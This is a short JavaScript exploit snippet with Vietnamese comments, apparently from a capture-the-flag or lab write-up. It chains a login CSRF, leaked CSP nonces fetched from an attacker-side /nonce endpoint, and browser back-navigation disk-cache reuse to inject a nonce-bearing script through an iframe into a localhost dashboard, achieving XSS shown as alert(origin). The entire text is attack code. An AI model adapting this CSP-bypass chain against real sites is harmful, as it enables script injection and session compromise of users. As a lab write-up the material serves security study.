...
onclick = async () => {
  w = window.open("", "w");  // Chuẩn bị một cửa sổ tên "w" để CSRF vào
  // ...
  w.location = "http://localhost:3000/dashboard?xss";  // 1: mở dashboard có query xss (nonce được cache cho đường dẫn này)
  await sleep(1000);
  const nonces = await fetch("/nonce").then((r) => r.json());  // 2: lấy các nonce (rò rỉ)
  // Chèn payload iframe chứa <script nonce='...'> để leak origin qua alert (ví dụ)
  login_csrf(nonces.map((nonce) => `<iframe srcdoc="<script nonce='${nonce}'>alert(origin)<\/script>"></iframe>`).join(""));
  await sleep(1000);
  w.location = "http://localhost:3000/dashboard";  // 3: nạp dashboard (khác path, sẽ không overwrite cache của /dashboard?xss)
  await sleep(1000);
  w.location = "http://127.0.0.1:8000/back?n=3";  // 4: quay về /dashboard?xss để kích hoạt Disk Cache với nonce cũ và XSS trên /profile
}
```